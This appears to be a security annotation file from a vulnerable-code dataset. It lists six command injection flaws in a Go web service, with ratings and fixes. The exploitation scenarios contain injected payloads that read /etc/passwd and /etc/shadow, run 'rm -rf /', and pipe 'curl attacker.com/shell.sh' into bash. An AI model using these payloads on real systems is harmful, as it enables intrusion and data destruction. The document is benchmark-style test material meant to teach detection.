# Security Companion Document: main.go

## Vulnerability: Direct Command Injection via exec.Command in Ping

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Obvious  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L24  

### Description
The `pingHost` function constructs a shell command by directly concatenating the user-supplied `host` query parameter into a string passed to `exec.Command` with `sh -c`. The `host` value from `c.Query("host")` is appended to the command string without any sanitization or validation.

### Exploitation Scenario
An attacker sends `GET /api/ping?host=127.0.0.1;cat /etc/passwd`. The semicolon terminates the `ping` command and executes `cat /etc/passwd`, returning sensitive system file contents. More destructive payloads such as `; rm -rf /` or reverse shell commands could achieve full system compromise.

### Remediation Guidance
Use `exec.Command` with separate arguments to avoid shell interpretation:
```go
cmd := exec.Command("ping", "-c", "3", host)
```
Additionally, validate the `host` parameter against a hostname/IP regex pattern.

### Complexity Rationale
This is rated Obvious because user input flows directly from the query parameter into `exec.Command` with `sh -c` and string concatenation, a textbook command injection pattern with no intermediate processing.

### Detection Difficulty Rationale
This is rated Easily_Detectable because `exec.Command("sh", "-c", ...)` with string concatenation is a well-known dangerous pattern that Go SAST tools like gosec flag reliably.

---

## Vulnerability: Shell Command Injection via exec.Command in DNS Lookup Helper

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L58-L59  

### Description
The `runDig` helper function constructs a shell command using `fmt.Sprintf` to embed the `domain` parameter into a `dig` command string, then executes it via `exec.Command` with `sh -c`. Although the `recordType` is validated against an allowlist in the calling `dnsLookup` function, the `domain` parameter is passed through without sanitization.

### Exploitation Scenario
An attacker sends `GET /api/dns/lookup?domain=example.com;id`. The `domain` value is interpolated into the shell command as `dig A example.com;id +short`, causing the shell to execute both `dig` and `id`. The attacker can chain arbitrary commands after the semicolon.

### Remediation Guidance
Use `exec.Command` with separate arguments:
```go
func runDig(domain, recordType string) string {
    out, err := exec.Command("dig", recordType, domain, "+short").Output()
    if err != nil {
        return ""
    }
    return strings.TrimSpace(string(out))
}
```

### Complexity Rationale
This is rated Moderate because the vulnerability is in a helper function called from the route handler. The `recordType` parameter is validated against an allowlist, which may create a false sense of security. A reviewer must trace the data flow to see that `domain` bypasses validation.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need interprocedural analysis to track the taint from `c.Query()` through `dnsLookup` into `runDig` and into the `exec.Command` call with `sh -c`.

---

## Vulnerability: Multi-Parameter Command Injection in Log Search

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Nuanced  
**Detection Difficulty:** Likely_Missed  
**Affected Lines:** L78  

### Description
The `searchLogs` function constructs a shell pipeline command using `fmt.Sprintf` that embeds three user-controlled parameters: `lines`, `logPath` (derived from the `logFile` parameter via `filepath.Join`), and `keyword`. All three are interpolated into a `tail | grep` pipeline and executed via `exec.Command` with `sh -c`. The `keyword` is wrapped in single quotes, but this provides no real protection since an attacker can break out of the quotes.

### Exploitation Scenario
An attacker sends `GET /api/logs/search?keyword=error'%3B%20id%20%23&file=syslog&lines=100`. The single quote breaks out of the grep pattern, the semicolon starts a new command, and `#` comments out the rest. The `lines` parameter can also inject commands: `GET /api/logs/search?keyword=test&lines=100;cat /etc/shadow%23`.

### Remediation Guidance
Avoid shell pipelines. Use separate `exec.Command` calls:
```go
tailCmd := exec.Command("tail", "-n", lines, logPath)
tailOut, _ := tailCmd.Output()
grepCmd := exec.Command("grep", keyword)
grepCmd.Stdin = bytes.NewReader(tailOut)
```

### Complexity Rationale
This is rated Nuanced because three separate user-controlled parameters are injected into a single shell pipeline, and the single-quote wrapping around the keyword creates a false appearance of sanitization. A reviewer must recognize that all three parameters are attack vectors.

### Detection Difficulty Rationale
This is rated Likely_Missed because the multiple injection points within a shell pipeline, combined with the pseudo-sanitization of single quotes and the use of `filepath.Join` for the log path, make this difficult for SAST tools to fully analyze.

---

## Vulnerability: Command Injection via Shell Execution in Archive

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L127  

### Description
The `archiveFiles` function constructs a shell command using `fmt.Sprintf` to embed the `req.Path` from the JSON request body into a `tar` command, then executes it via `exec.Command` with `sh -c`. While the `archiveName` undergoes basic sanitization (replacing `/` and `\` with `_`), the `req.Path` parameter is embedded directly without any validation.

### Exploitation Scenario
An attacker sends `POST /api/files/archive` with body `{"path": "/tmp/data; curl attacker.com/shell.sh | bash", "name": "backup"}`. The path value is interpolated into the `tar` command, and the shell executes the injected commands, achieving remote code execution.

### Remediation Guidance
Use `exec.Command` with argument lists:
```go
cmd := exec.Command("tar", "czf", archivePath, req.Path)
```

### Complexity Rationale
This is rated Moderate because the vulnerability is partially obscured by the sanitization applied to the adjacent `archiveName` parameter. A reviewer must recognize that `req.Path` bypasses the sanitization.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because the taint flows from JSON body binding through struct fields into `fmt.Sprintf` and then to `exec.Command` with shell execution. Tools need to track JSON body parameters through struct bindings.

---

## Vulnerability: Command Injection via Shell Execution in Port Check

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L147  

### Description
The `checkPort` function constructs a shell command using `fmt.Sprintf` to embed the `req.Host` parameter into a `nc` (netcat) command, then executes it via `exec.Command` with `sh -c`. While the `req.Port` parameter undergoes integer binding and range validation, the `req.Host` parameter from the JSON request body is embedded directly without sanitization.

### Exploitation Scenario
An attacker sends `POST /api/network/check` with body `{"host": "127.0.0.1; whoami", "port": 80}`. The `host` value is interpolated into the `nc` command, and the shell executes both `nc` and `whoami`.

### Remediation Guidance
Use `exec.Command` with argument lists:
```go
cmd := exec.Command("nc", "-zv", "-w", "3", req.Host, strconv.Itoa(req.Port))
```

### Complexity Rationale
This is rated Moderate because the adjacent `port` parameter has proper integer validation via struct binding, which may create a false sense of security. However, the `host` parameter is directly embedded without validation.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the taint flow from JSON body to `exec.Command` with `sh -c` and `fmt.Sprintf` is a standard pattern that SAST tools detect reliably.

---

## Vulnerability: Direct Command Injection via exec.Command in WHOIS Lookup

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Obvious  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L172  

### Description
The `whoisLookup` function constructs a shell command by directly concatenating the user-supplied `domain` query parameter into a string passed to `exec.Command` with `sh -c`. The `domain` value from `c.Query("domain")` is appended to the command string without any sanitization.

### Exploitation Scenario
An attacker sends `GET /api/whois?domain=example.com;id`. The semicolon terminates the `whois` command and executes `id`, returning the current user information. More destructive payloads could achieve remote code execution.

### Remediation Guidance
Use `exec.Command` with separate arguments:
```go
cmd := exec.Command("whois", domain)
```

### Complexity Rationale
This is rated Obvious because user input flows directly from the query parameter into `exec.Command` with `sh -c` and string concatenation, identical to the ping vulnerability pattern.

### Detection Difficulty Rationale
This is rated Easily_Detectable because `exec.Command("sh", "-c", ...)` with string concatenation is a well-known dangerous pattern that Go SAST tools flag reliably.
